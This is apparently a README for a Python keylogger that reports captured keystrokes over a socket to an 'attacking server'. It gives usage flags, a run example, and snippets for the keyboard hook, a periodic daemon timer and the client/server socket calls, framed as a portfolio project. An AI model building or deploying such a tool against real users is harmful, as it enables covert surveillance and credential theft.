# Key_Logger_Socket
## Motivation
Build a portfolio for strong python and networking background
Develop a simple keylogger script with added remote connection feature using python socket module

## Usages
```
Usage:
 -i: interval time
 --ip: IP address of the listening server
 -m: method for report the logged key event
```
Example:
```
python Attack_SVR.py
python Key_Logger_Socket.py -i 5 --ip "localhost" -m "chat_svr"
```
### Note
<br>If no method specified, file_reporting will be used.

## Features
### Keyboard module
```
 keyboard.on_release(callback=callback)
```
<br>For every KeyUp events caught by on_release() method from keyboard class, calls the callback funcntion. Callback function would categorize the KeyUp event and populate the log variable. Using callback allow the next line of code to run without having to wait for the return values of on_release()</br>
### Daemon thread and periodic calling
```
timer = Timer(interval=self.interval, function=self.chat_svr_report)
timer.daemon = True
timer.start()
```
Daemon thread will be killed whenever the main thread (Keyboard) dies. Timer class from threading module will allow this function to call itself periodically every [interval] seconds.
### Network Connection
#### Initialize s socket to create a connection back to attacking server
```
 s = socket.socket(AF_INET,SOCK_STREAM)
```
#### On client side
```
 s.connect()
 s.send()
 s.close()
```
#### On server side
```
 s.bind()
 s.listen()
 s.accept()
```
